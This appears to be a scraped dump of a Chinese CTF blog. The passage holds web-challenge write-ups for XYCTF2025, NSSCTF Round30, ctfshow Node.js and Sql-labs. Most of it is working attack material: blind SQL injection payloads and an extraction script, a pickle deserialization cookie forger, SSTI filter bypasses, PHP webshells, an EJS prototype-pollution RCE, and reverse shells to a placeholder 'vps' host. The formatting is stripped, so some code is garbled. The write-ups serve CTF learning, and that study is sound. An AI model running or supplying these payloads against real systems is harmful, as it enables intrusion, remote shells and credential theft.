file_put_contents($safe_log_file, .?.php.\\r ); if(isset($safe_word)) echo 未检测到危险代码，.$safe_word.，非常安全; else echo 欢迎使用gxngxngxn的恶意代码检测器！！！; 并且不难发现这是thinkphp的网站 那么肯定是和tp有关的特性 我自己做的时候不知道 后面看wp才知道 在 ThinkPHP（TP）框架中，$ 符号常用于模板引擎的表达式解析。在模板中，$ 可以嵌入 PHP 表达式，这些表达式会被解析并执行。它通常用于输出数据或在模板中执行一些简单的 PHP 逻辑。 可以使用${} 1.使用input函数 input() 是 ThinkPHP 6 中的一个函数。它是 ThinkPHP 框架提供的一个用来获取请求数据（如 GET、POST 或 PUT 请求中的参数）的函数。 code=$input(0)(input(1))0=system1=cat+/f* 2.使用unsort code=$usort((ge.tallheaders)(),sys.tem) POST /public/index.php HTTP/1.1Host: gz.imxbt.cn:20012aaa: lsContent-Length: 41User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Origin: http://gz.imxbt.cn:20012Referer: http://gz.imxbt.cn:20012/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0Connection: close","tags":["CTF-wp"]},{"title":"XYCTF2025-WEB WP","path":"/2025/04/09/XYCTF2025-WEB/","content":"前言:由于笔者能力有限，只写了自己能力以内的题的WPez_puzzlejs代码游戏 禁了一些常用快捷键 我的做法是将所有代码拉下来 自己本地用phpstudy起了一个服务 具体改源代码逻辑 if (G yw4) 改为 if (G yw4) 这个是判断时间是否小于两秒的逻辑 把其改为大于 自己玩一遍拼图就ok了 flagY0u__aRe_a_mAsteR_of_PUzZL!!@!!~! ezsql(手动滑稽)sql毋庸置疑 注入点是usrname 闭合时单引号 fuzz一下发现过滤了,空格等 首先空格使用%09绕过 因为,被ban了的原因 很多语句都不可以用 使用 case when语句来进行时间盲注 语句构造： !!!请注意:python里盲注要把%09改为\\t 因为request库会将\\t编码为%09 爆数据库 testdb 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 爆表 double_check,user 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(table_name)%09FROM%09information_schema.tables%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 爆列secret,username,password 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(column_name)%09FROM%09information_schema.columns%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 爆数据 过滤了逗号一个一个 usernameyudeyoushang passwordzhonghengyisheng secretdtfrtkcc0czkoua9S 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(username)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END#1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(password)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END#1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(secret)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 好了现在就是超级时刻 拿着爆出的账号密码登录 然后进入发现要输入密钥 输入secret爆出的东西 进入一个命令执行系统 执行命令就可以 过滤空格且无回显写入文件就好了 cat$IFS/f*1.txt sql时间盲注模板 import requestsimport timeurl = urldef get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = f1\\tor\\tCASE\\tWHEN\\t(ASCII(SUBSTRING((SELECT\\tGROUP_CONCAT(secret)\\tFROM\\tdouble_check)\\tFROM\\ti\\tFOR\\t1))mid)\\tTHEN\\tSLEEP(2)\\tELSE\\t0\\tEND# params = username: payload, password: 1, start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 1.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) Signin下载附件审计源码 from bottle import Bottle, request, response, redirect, static_file, run, routewith open(../../secret.txt, r) as f: secret = f.read()app = Bottle()@route(/)def index(): return HI@route(/download)def download(): name = request.query.filename if ../../ in name or name.startswith(/) or name.startswith(../) or \\\\ in name: response.status = 403 return Forbidden with open(name, rb) as f: data = f.read() return data@route(/secret)def secret_page(): try: session = request.get_cookie(name, secret=secret) if not session or session[name] == guest: session = name: guest response.set_cookie(name, session, secret=secret) return Forbidden! if session[name] == admin: return The secret has been deleted! except: return Error!run(host=0.0.0.0, port=8080, debug=False) download下存在目录穿越 但是过滤了....搜寻资料用下./.././../ payload：./.././../secret.txt 获取到secret_key：Hell0_H@cker_Y0u_A3r_Sm@r7 那就进行session伪造 当前name: !4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu 很奇怪对吧 丢给ai问下 直接叫他帮你写脚本 import pickleimport base64import hmacimport hashlibsecret = bHell0_H@cker_Y0u_A3r_Sm@r7# 1. 保持原始结构，只替换guest部分original_structure = [name, name: admin] # 关键修改点# 2. 序列化pickled_data = pickle.dumps(original_structure)print(=== 编码前的恶意数据结构 ===)print(fPython对象: original_structure)print(fPickle字节: pickled_data)# 3. 生成cookieencoded_data = base64.b64encode(pickled_data).decode(utf-8)signature = hmac.new(secret, encoded_data.encode(), hashlib.sha256).digest()malicious_cookie = f!base64.b64encode(signature).decode()?encoded_dataprint( === 最终恶意cookie ===)print(malicious_cookie)得到 !w7ggni+OONpuUroWJe5pEGGQSE1aUyCHrz6RoSzaQEA=?gASVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFYWRtaW6Uc2Uu 然后提交会触发 但是没什么用 pickle反序列化 import pickleimport base64import hmacimport hashlibsecret = bHell0_H@cker_Y0u_A3r_Sm@r7class MaliciousPayload: def __reduce__(self): import os return (os.system, (cat /flag* /flag,)) # 替换为你需要的命令# 1. 保持原始结构，只替换guest部分original_structure = [name, name: MaliciousPayload()] # 关键修改点# 2. 序列化pickled_data = pickle.dumps(original_structure)print(=== 编码前的恶意数据结构 ===)print(fPython对象: original_structure)print(fPickle字节: pickled_data)# 3. 生成cookieencoded_data = base64.b64encode(pickled_data).decode(utf-8)signature = hmac.new(secret, encoded_data.encode(), hashlib.sha256).digest()malicious_cookie = f!base64.b64encode(signature).decode()?encoded_dataprint( === 最终恶意cookie ===)print(malicious_cookie) 注意这里有一点小坑:linux和win运行这个脚本的结果是不一样的 linux是 win是 linux的才是对的 问了问其他师傅 说是 win会记录 os.system 的 win 实现 nt.systemLinux记录的是 os.system 的 Linux 实现 posix.system 而脚本里的hash只要有一个字符就会不同 所以生成结果不同 先 再 XYCTFWe1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u! 出题人已疯源码 # -*- encoding: utf-8 -*-@File : app.py@Time : 2025/03/29 15:52:17@Author : LamentXU import bottleflag in /flag@bottle.route(/)def index(): return Hello, World!@bottle.route(/attack)def attack(): payload = bottle.request.query.get(payload) if payload and len(payload) 25 and open not in payload and \\\\ not in payload: return bottle.template(hello +payload) else: bottle.abort(400, Invalid payload)if __name__ == __main__: bottle.run(host=0.0.0.0, port=5000) 限制是25个字符 _import__(os).system(cat /f*123) 这是要总共执行的payload 但是超过了25个字符 如何绕过呢 看了出题人的wp 本质上还是给一个变量不断地赋值 最后达到绕过25个字符的标准 类似的题可以见VNCTF2025 里的学生管理系统 VN里用的是海象表达式(因为题目是多行) 而这道题是单行 所以就将payload按照几个字符一组 弄成了列表 通过循环不断赋值 最终payload import requestsurl = url/attackpayload = __import__(os).system(cat /f*123)p = [payload[i:i+3] for i in range(0,len(payload),3)]flag = Truefor i in p: if flag: tmp = f %import os;os.a=i flag = False else: tmp = f %import os;os.a+=i r = requests.get(url,params=payload:tmp)r = requests.get(url,params=payload: %import os;eval(os.a))r = requests.get(url,params=payload: %include(123)).text //这一步是读取服务器下的生成的文件123print(r) flagL@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01 Fate源代码 #!/usr/bin/env python3import flaskimport sqlite3import requestsimport stringimport jsonapp = flask.Flask(__name__)blacklist = string.ascii_lettersdef binary_to_string(binary_string): if len(binary_string) % 8 != 0: raise ValueError(Binary string length must be a multiple of 8) binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)] string_output = .join(chr(int(chunk, 2)) for chunk in binary_chunks) return string_output@app.route(/proxy, methods=[GET])def nolettersproxy(): url = flask.request.args.get(url) if not url: return flask.abort(400, No URL provided) target_url = http://lamentxu.top + url for i in blacklist: if i in url: return flask.abort(403, I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~) if . in url: return flask.abort(403, No ssrf allowed) response = requests.get(target_url) return flask.Response(response.content, response.status_code)def db_search(code): with sqlite3.connect(database.db) as conn: cur = conn.cursor() cur.execute(fSELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(code)))))))) found = cur.fetchone() return None if found is None else found[0]@app.route(/)def index(): print(flask.request.remote_addr) return flask.render_template(index.html)@app.route(/1337, methods=[GET])def api_search(): if flask.request.remote_addr == 127.0.0.1: code = flask.request.args.get(0) if code == abcdefghi: req = flask.request.args.get(1) try: req = binary_to_string(req) print(req) req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) except: flask.abort(400, Invalid JSON) if name not in req: flask.abort(400, Empty Persons name) name = req[name] if len(name) 6: flask.abort(400, Too long) if \\ in name: flask.abort(400, NO ) if ) in name: flask.abort(400, NO )) Some waf hidden here ;) fate = db_search(name) if fate is None: flask.abort(404, No such Person) return Fate: fate else: flask.abort(400, Hello local, and hello hacker) else: flask.abort(403, Only local access allowed)if __name__ == __main__: app.run(debug=True) proxy路由下进行ssrf 但是过滤了. 就尝试用十进制来绕过本地回环地址 当加入@ 就只解析@后面的网址 要访问本地的1337路由 于是写入payload/proxy?url=@2130706433:8080/1337 然后1337路由下要满足传入的0参数值为abcdefghi 但是黑名单是过滤了字母 这里就有个小trick url二次编码绕过 满足后又可以传入1参数 1 要进行sql注入 if flask.request.remote_addr == 127.0.0.1: code = flask.request.args.get(0) if code == abcdefghi: req = flask.request.args.get(1) try: req = binary_to_string(req) print(req) req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) except: flask.abort(400, Invalid JSON) if name not in req: flask.abort(400, Empty Persons name) import sqlite3conn = sqlite3.connect(database.db)conn.execute(CREATE TABLE FATETABLE ( NAME TEXT NOT NULL, FATE TEXT NOT NULL);)Fate = [ (JOHN, 1994-2030 Dead in a car accident), (JANE, 1990-2025 Lost in a fire), (SARAH, 1982-2017 Fired by a government official), (DANIEL, 1978-2013 Murdered by a police officer), (LUKE, 1974-2010 Assassinated by a military officer), (KAREN, 1970-2006 Fallen from a cliff), (BRIAN, 1966-2002 Drowned in a river), (ANNA, 1962-1998 Killed by a bomb), (JACOB, 1954-1990 Lost in a plane crash), (LAMENTXU, r2024 Send you a flag flagFAKE)]conn.executemany(INSERT INTO FATETABLE VALUES (?, ?), Fate)conn.commit()conn.close() 请注意要urlencode编码 要用desc可以逆向查询 /proxy?url=@2130706433:8080/1337?0=%2561%2562%2563%2564%2565%2566%2567%2568%2569%261=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101 flagDo4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus! 总结这是本新手第一次参加XYCTF 反正我自己挺坐牢的( 赛题web就出了三道简单题 但是可以学到东西就好 SSTI考难了根本不会(× 还有一些自己不熟悉的小trick 不过慢慢来！","tags":["CTF-wp"]},{"title":"NSSCTF Round30 Basic双人组队赛","path":"/2025/04/07/NSSCTF Round30 Basic双人组队赛/","content":"hack_the_world!from flask import Flask, request, render_template,render_template_string, url_for, sessionimport timeimport osapp = Flask(__name__)app.secret_key = NSSFILTER_KEYWORDS = [Ciallo～(∠・ω ＜）⌒★]def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: return True return False@app.route(/, methods=[GET, POST])def index(): session[user] = Gamer return render_template(index.html)@app.route(/hack, methods=[GET, POST])def hack(): if session.get(user) != hacker: return render_template(die.html,user=session.get(user)) if (abc:=request.headers.get(User-Agent)) is None: return render_template(fobidden.html) cmd = request.form.get(cmd,noting) if (answer:=request.args.get(answer)) == hack_you: if contains_forbidden_keywords(cmd): return render_template(forbidden.html) else: render_template_string(fcmd,cmd=cmd) css_url = url_for(static, filename=style.css) js_url = url_for(static, filename=script.js) return render_template_string(f !DOCTYPE html html lang=zh head meta charset=UTF-8 meta name=viewport content=width=device-width, initial-scale=1.0 titlefake world/title link rel=stylesheet href=css_url !-- No ping No curl No nc , little hacker blind no way-- /head body canvas class=matrix/canvas div class=bg-animation/div div class=container h1So, what are you trying to do/h1 pJust quit, little hacker. There’s nothing for you here./p /div script src=js_url/script /body /html , css_url=css_url,js_url=js_url) 源码经过审计 可以确定为ssti + flask.session伪造 flask伪造secret-key:NSS 得到session:eyJ1c2VyIjoiaGFja2VyIn0.Z_IwwQ.fYDi-wb5WZ3xq_Q2oxb3JSg7Qjw 修改访问hack SSTI满足get传入answerhack_you post传入cmd参数 即ssti注入点 输入49无反应 尝试随便输了几个也没反应 用burp fuzz一下 找到了waf 黑名单:[‘.’,’_’,’]’,’%’,’read’,’mro’] 看响应包也有提示 结合前面除waf以外不回显 判断为盲注 传入payload: 要url编码 lipsum|attr(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+globals+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)|attr(get)(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+builtins+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)|attr(get)(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+import+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)(os)|attr(popen)([十六进制编码后的bash -c bash -i /dev/tcp/vps/port 01])|attr(read)() 监听自己端口 vps成功反弹shell 你是谁的菜鸟，又是谁的佬大进去无信息 查看源码发现提示 $NSS = $_GET[NSS]; if (!preg_match(/([A-Z]|;| |\\$|~|\\#|\\(|\\^)/i, $NSS)) exec($NSS); else echo $Narration; 无字母RCE 一般的都不能用 这里介绍一种方法 具体原理见p神文章 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 首先本地起一个html文件 !DOCTYPE htmlhtmlhead meta charset=utf-8 titlePOST 传输数据包 POC/title/headbody form action=http://node1.anna.nssctf.cn:28468/ method=post enctype=multipart/form-data label for=file文件名：/label input type=file name=file id=filebr input type=submit name=submit value=提交 /form/body/html 上传一个文件 1.txt #!/binecho PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= | base64 -d shell.php //写一句话木马到shell.php文件 上传后自动跳转到网页 抓包即可 get传入?NSS.%09???????????[@-[] 再访问shell.php 成功访问 写马成功 连接蚁剑 根目录找flag文件即可 你也是迷宫高手吗进入靶机发现是个小游戏 限时10s完成10个迷宫 迷宫随机 很明显的reqeust库写脚本 非常考验写脚本*(调教ai的能力×* 笔者不想多写 详见官方wp https://www.nssctf.cn/note/set/12045 简单的PHPphp类型题 第一关 ?phpinclude jeer.php;highlight_file(__FILE__);error_reporting(0);$A = 0;$B = 0;$C = 0;//第一关if (isset($_GET[one])) $str = $_GET[str] ?? 0; $add = substr($str, 0, 1); $add++; if (strlen($add) 1 ) $A = 1; else echo $one; else echo $begin;//第二关if (isset($_GET[two])) $comment = $_GET[comment] ?? echo(114514); if (!preg_match(/(|;| |\\$|~|\\#|`|\\|\\|\\*|?|||\\r| |\\^)/i, $comment) strlen($comment) 20) try eval($B = 1;.$comment.;echo $two;die();); catch (Error $e) echo $boom; //第三关if (isset($_GET[three])) if (isset($_POST[one])isset($_POST[two])) $a1=(string)$_POST[one]; $a2=(string)$_POST[two]; if ($a1 !== $a2 sha1($a1) === sha1($a2)) $C = 1; else echo $three; if ($A == 1 $B == 1 $C == 1) echo file_get_contents($_POST[file]);? 前面的不赘述 就考cve搓脚本啦 之前ghctf的时候刚刚好把改好的拿来用 项目地址：https://github.com/ambionics/cnext-exploits 虚拟机clone下来 然后把里面的脚本改为下面这个 执行命令就好 📂 点击展开 cne.py % include cne.py % kali执行命令 python3 cne.py http://node7.anna.nssctf.cn:21532/ echo ?php @eval(\\$_POST[\\cmd\\]);? 22.php 访问22.php 写入木马成功 终端读取flag 呵呵喜欢藏flag 用 find / -name *flag* 找到可疑目录 114514flag 读取 成功得到flag","tags":["CTF-wp"]},{"title":"Node.js原型链污染学习","path":"/2025/04/06/JS原型链污染/","content":"原型链污染学习链接：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1 node.jsjs创建对象的形式1.普通创建var name=name:sauy,age:19var person= 2.构造函数方法创建function person() this.name=sauy; this.test=function () return 23333; person.prototype.a=3;web=new person();console.log(web.test());console.log(web.a) 3.通过object创建var a=new object();a.c=3console.log(a,c) prototype和__proto__prototype原型对象 __proto__ 原型链连接点 function Foo() this.bar=1Foo.prototype.show = function show() console.log(this.bar) let foo = new foo() foo.show() 1.用法（有点绕对象.ptoto构造器(构造函数).prototype 构造器.prototype其实也是一个对象，为构造函数的原型对象，同样有__proto__属性，一直通过原型链__proto__最终可找到null。 我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。这时候，就该__proto__登场了。 一个Foo类实例化出来的foo对象，可以通过foo.__proto__属性来访问Foo类的原型，也就是说： foo.__proto__ == Foo.prototype 理解：每个类对象实例化的时候都会拥有prototype中的属性和方法 一个对象的__proto__的属性，指向这个对象所在类的prototype的属性 var A=function();var a=new A();链子顺序如下图： Ex： function Father() this.first_name = Donald this.last_name = Trump function Son() this.first_name = Melania Son.prototype = new Father() //让son的父类为father 子类主动去选择了父类 let son = new Son()console.log(`Name: $son.first_name $son.last_name`)//最后son继承的father的last_name的属性-输出：Name:Melania Trump 调用son.last_name的时候 实际js内部的操作： son中找不到last_name，就在son.__ptoto__中寻找last_name,这里找到了last_name于是就输出 如果没有找不到，则在son.__proto__.__proto__中继续寻找,以此类推，直到null结束。 上面描述的js的查找机制就称为：prototype继承链 原型链污染1.上述描述实践 // foo是一个简单的JavaScript对象let foo = bar: 1 // foo.bar 此时为1console.log(foo.bar) // 修改foo的原型（即Object）foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar) // 此时再用Object创建一个空的zoo对象let zoo = // 查看zoo.barconsole.log(zoo.bar)最后，虽然zoo是一个空对象，但zoo.bar的结果居然是2： 解释：因为前面我们修改了foo的原型foo.__proto__.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。 后来，我们又用Object类创建了一个zoo对象let zoo {}，zoo对象自然也有一个bar属性了 2.切入口 实现原型链污染找到控制数组(对象)的键名的操作就可以： 对象和属性的表达方式很多，如下图： 对象merge(合并) 对象clone(克隆) merge：下述代码展示了merge的具体功能 function merge(target, source) for (let key in source) if (key in source key in target) merge(target[key], source[key]) else target[key] = source[key] 理解: const obj1 = a: 1, b: x: 10 ;const obj2 = b: y: 20 , c: 3 ;merge(obj1, obj2);console.log(obj1);//最后会输出 a: 1,b: x: 10, y: 20 ,c: 3 a和c都只存在各自的类里，b两个类都有，所以合并在一起。 let o1 = let o2 = a:1,__proto__:b:2merge(o1,o2)console.log(o1.a,o1.b)o3 = console.log(o3.b) 上述代码成功合并 3.攻击方式 function Father() this.first_name = Donald this.last_name = Trump function Son() this.first_name = Melania Son.prototype = new Father() let son = new Son()son.__ptoto__[lat_name] = hello;let secondson = new Son();console.log(`son Name:$son.last_name`);console.log(`secondson Name:$secondson.last_name`);-son Name: hello-second Name: hello let foo = bar:1foo.__proto__.bar = require(\\child_process\\).execSync(\\calc\\);let zoo = eval(zoo.bar) hero.name: 锐雯,__proto__.block: type: Text,line:process.mainModule.require(child_process).execSync(wget ip:port/`cat /*f*`)hero.name: 锐雯,__proto__: hero.name: return e = for (var a in ) delete Object.prototype[a]; return global.process.mainModule.constructor._load(child_process).execSync(id) 例题：node.js代码审计 [西湖论剑 2022]Node Magical Loginconst fs = require(fs);const SECRET_COOKIE = process.env.SECRET_COOKIE || this_is_testing_cookieconst flag1 = fs.readFileSync(/flag1)const flag2 = fs.readFileSync(/flag2)function LoginController(req,res) try const username = req.body.username const password = req.body.password if (username !== admin || password !== Math.random().toString()) res.status(401).type(text/html).send(Login Failed) else res.cookie(user,SECRET_COOKIE) res.redirect(/flag1) catch (__) function CheckInternalController(req,res) res.sendFile(check.html,root:static)function CheckController(req,res) let checkcode = req.body.checkcode?req.body.checkcode:1234; console.log(req.body) if(checkcode.length === 16) try checkcode = checkcode.toLowerCase() if(checkcode !== aGr5AtSp55dRacer) res.status(403).json(msg:Invalid Checkcode1: + checkcode) catch (__) res.status(200).type(text/html).json(msg:You Got Another Part Of Flag: + flag2.toString().trim()) else res.status(403).type(text/html).json(msg:Invalid Checkcode2: + checkcode) function Flag1Controller(req,res) try if(req.cookies.user === SECRET_COOKIE) res.setHeader(This_Is_The_Flag1,flag1.toString().trim()) res.setHeader(This_Is_The_Flag2,flag2.toString().trim()) res.status(200).type(text/html).send(Login success. Welcome,admin!) if(req.cookies.user === admin) res.setHeader(This_Is_The_Flag1, flag1.toString().trim()) res.status(200).type(text/html).send(You Got One Part Of Flag! Try To Get Another Part of Flag!) else res.status(401).type(text/html).send(Unauthorized) catch (__) module.exports = LoginController, CheckInternalController, Flag1Controller, CheckController const express = require(express)const fs = require(fs)const cookieParser = require(cookie-parser);const controller = require(./controller)const app = express();const PORT = Number(process.env.PORT) || 80const HOST = 0.0.0.0app.use(express.urlencoded(extended:false))app.use(cookieParser())app.use(express.json())app.use(express.static(static))app.post(/login,(req,res) = controller.LoginController(req,res))app.get(/,(res) = res.sendFile(__dirname,static/index.html))app.get(/flag1,(req,res) = controller.Flag1Controller(req,res))app.get(/flag2,(req,res) = controller.CheckInternalController(req,res))app.post(/getflag2,(req,res)= controller.CheckController(req,res))app.listen(PORT,HOST,() = console.log(`Server is listening on Host $HOST Port $PORT.`)) web335使用js里的eval执行命令 1.require(child_process).execSync(cat f*) ?eval=require(child_process)[exe%2BcSync](ls) 绕过对exec的限制 2.require(child_process).spawnSync(ls,[.]).stdout.toString() require(child_process).spawnSync(cat,[fl001g.txt]).stdout.toString() 3.global.process.mainModule.constructor._load(child_process).execSync(ls,[.]).toString() require 是 Node.js 中用来引入模块的函数，在这里引用了Node.js的child_process模块child_process 模块是 Node.js 标准库中的一个模块，它提供了创建子进程的功能，可以通过它执行系统命令、shell 脚本等。其中包含有spawnSync()方法，spawnSync函数可以用来执行系统命令spawnSync(‘ls’,[‘.’]) 前面代表命令，后面是一个参数，这里的 . 代表着当前目录， … 代表上一级目录 …/… 代表上上级目录这中间用于连接的两个点是用来访问对象属性的stdout’是一个缓冲区，它包含了子进程的标准输出，也就是说输出的内容在这里toString()转换为字符串 web36过滤了load和exec 使用上一次那个命令就好 web337var express = require(express);var router = express.Router();var crypto = require(crypto);function md5(s) return crypto.createHash(md5) .update(s) .digest(hex);/* GET home page. */router.get(/, function(req, res, next) res.type(html); var flag=xxxxxxx; var a = req.query.a; var b = req.query.b; if(a b a.length===b.length a!==b md5(a+flag)===md5(b+flag)) res.end(flag); else res.render(index, msg: tql); );module.exports = router; 1.传入a[]1b[]2 a=x:1b=x:2 web338基础原型链污染 var express = require(express);var router = express.Router();var utils = require(../utils/common); /* GET home page. */router.post(/, require(body-parser).json(),function(req, res, next) res.type(html); var flag=flag_here; var secert = ; var sess = req.session; let user = ; utils.copy(user,req.body); if(secert.ctfshow===36dboy) res.end(flag); else return res.json(ret_code: 2, ret_msg: 登录失败+JSON.stringify(user)); ); module.exports = router; module.exports = copy:copy;function copy(object1, object2) for (let key in object2) if (key in object2 key in object1) copy(object1[key], object2[key]) else object1[key] = object2[key] payload: username:11,password:11,__proto__:ctfshow:36dboy//就是通过这个来改变成员属性 secret的父类都有ctfshow这个对象 于是他也有 web339Ejs原型链污染EJS是一个javascript模板库，用来从json数据中生成HTML字符串 % code %用来执行javascript代码 其实和ssti差不多 不过ssti是\\执行python代码 预期解 变量覆盖在login下post __proto__:query:return global.process.mainModule.constructor._load(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\) 然后再访问api 多尝试几次 监听到然后rce找flag 原理：其实还是就是原型链污染 object可以被子类继承 仿照题目代码的小demo function copy(object1, object2) for (let key in object2) if (key in object2 key in object1) copy(object1[key], object2[key]) else object1[key] = object2[key] user = body = JSON.parse(__proto__:query:return 2233);copy(user, body) query: Function(query)(query)//会输出 query: 2233 /*首先看看 query 值是如何被改变的，其实就是通过 web338 的原型链污染，即 JS 中所有的对象的原型都可以继承到 Object，然后终点是 null 对象*/ 非预期解 ejs模板漏洞__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2 直接在·login目录·传·这个·payload就·ok 监听1234端口就好 web340这个题就是·要进行两次污染关键代码 var express = require(express);var router = express.Router();var utils = require(../utils/common);/* GET home page. */router.post(/, require(body-parser).json(),function(req, res, next) res.type(html); var flag=flag_here; var user = new function() this.userinfo = new function() this.isVIP = false; this.isAdmin = false; this.isAuthor = false; ; utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin) //污染两次·才可以·正确· res.end(flag); else return res.json(ret_code: 2, ret_msg: 登录失败); );module.exports = router; payload:__proto__:__proto__:query:return global.process.mainModule.constructor._load(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\) 也是先在login路由 然后访问api路由 web341__proto__:__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2 __proto__:__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2","tags":["CTF学习"]},{"title":"Sql-labs部分题解","path":"/2025/04/06/Sql-labs部分题解/","content":"level-1字符型 ‘注入 -1 union select 1,2,group_concat(username,id,password) from users--+ 唯一注意点就是查询时要用-1 因为我们要得到union后的结果 level-2数字型注入 后面过程和level-1一样 -1 union select 1,2,group_concat(username,id,password) from users--+ level-3输入1’ 回显中有个) 说明sql语句里有() 考虑加入) 与前面的( 构成闭合 1’ ) –+构造闭合成功 后面与level-1 level-2 一样 -1) union select 1,2,group_concat(username,id,password) from users--+ level-4双引号和括号构造闭合 -1) union select 1,2,group_concat(username,id,password) from users--+ level-51’ –+ 没有回显 采用报错注入 1 and updatexml(1,concat(0x7e,database()),1) --+ #爆出数据库 1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=security),1,32)),1)--+ 1 and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=security and table_name=users),1,32)),1) --+ 1 and updatexml(1,concat(0x7e,substr((select group_concat(username,id,password) from users),1,30)),1) --+#这里回显的并非全部内容 1 and updatexml(1,concat(0x7e,(select username from users limit ,1)),1) --+1 and updatexml(1,concat(0x7e,(select username from users limit 1,1)),1) --+#用limit一个一个看字段内容 报错注入原理MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。所以我们可以利用第二个参数来得到我们想要的敏感数据。 updatexml()函数updatexml(xml_doument,XPath_string,new_value)第一个参数：XML的内容第二个参数：是需要update的位置XPATH路径第三个参数：是更新后的内容所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH 长度限制updatexml() 函数的报错内容长度不能超过32个字符，解决方式有两种： 1.limit 分页 ?id=-1 and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) --+ 2.substr()截取字符 ?id=-1 and updatexml(1,concat(0x7e,substr((select group_concat(user)from mysql.user), 1 , 31)),3) --+ 意思为从第一个字符开始截取31个字符 level-6和level-5类似 不过是”闭合 1 and updatexml(1,concat(0x7e,substr((select group_concat(username,id,password) from users),1,30)),1) --+ level-7考点：sql写入文件写入条件：权限为root、知道网站的物理路径、secure_file_priv空 secure_file_priv的值为null ，表示限制mysqld不允许导入|导出secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制 注意点：要知道web路径 EX: D:\\phpstudy_pro\\WWW\\a.txt #文件路径不能使用反斜线\\，要使用斜线 文件内容可以是一句话木马等 读文件：load_file 读取文件内容 load_file(‘varwwwhtmlflag.php’) root权限在已知绝对路径的情况下 写文件用法：into outfile(可以写入多行，按格式输出) into dumpfile(写入单行没有输出格式) 1)) union select 1,?php @eval($_POST[attack]);?,3 into outfile 